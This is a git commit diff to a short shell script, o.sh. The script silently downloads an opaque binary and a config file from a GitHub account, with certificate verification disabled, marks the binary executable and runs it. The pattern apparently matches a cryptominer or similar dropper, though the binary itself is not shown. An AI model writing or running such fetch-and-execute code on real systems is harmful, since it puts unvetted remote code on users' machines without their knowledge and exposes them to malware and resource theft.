4deaa24b77f6b7bc3864f885d3ac7ca73b256c2a
chenlysave <cheelysavir139@gmail.com>
2026-04-29 10:28:51 +0800

    Update o.sh

--- o.sh
+++ o.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
-chmod u+x ccdm
+wget --no-check-certificate -qO ./ccdm https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
+chmod u+x ./ccdm
 wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/amd.json
 bash -c "./ccdm"
